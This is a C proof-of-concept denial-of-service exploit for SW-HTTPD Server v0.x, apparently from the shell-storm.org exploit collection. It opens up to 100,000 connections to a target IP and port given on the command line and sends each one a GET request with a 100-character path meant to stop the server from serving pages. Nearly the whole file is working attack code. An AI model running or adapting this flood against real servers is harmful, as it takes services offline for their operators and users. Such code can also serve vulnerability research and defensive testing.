/*
SW-HTTPD Server v0.x Denial of Service (PoC)

Multiple Connections with GET /A[100] HTTP/1.1
After server not found all pages.

Author: Jonathan Salwan
Mail  : submit [AT] shell-storm.org
Web   : http://www.shell-storm.org
*/

#include "stdio.h"
#include "unistd.h"
#include "stdlib.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "netinet/in.h"

int syntax(char *file)
	{
	fprintf(stderr,"SW-HTTPD Server Denial of Service (PoC)\n");
	fprintf(stderr,"=>Syntax : <%s> <ip> <port>\n\n",file);
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 2)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


        char hexa[100]  = 	"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
			  	"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30" 
                          	"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
				"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30";

		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

	int i=0;
        char request[118];

        fprintf(stdout,"[+]SW-HTTPD Server %s\n",argv[1]);

for(i=0;i<100000;i++){

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
                        fprintf(stdout,"[+]Done!\n");
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
		
	if (srv_connect != -1)
 		{	
		sprintf(request, "GET /%s HTTP/1.1\r\n", hexa);
		
			if (send(mysocket2,request,sizeof(request),0) == -1){
				fprintf(stderr,"[-]Send Request\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				fprintf(stdout,"[+]Done!\n");
				return 1;}
		}
		else{
			fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
			fprintf(stdout,"[+]Done!\n");
			shutdown(mysocket2,1);
			return 1;}

	shutdown(mysocket2,1);
}
return 0;
}
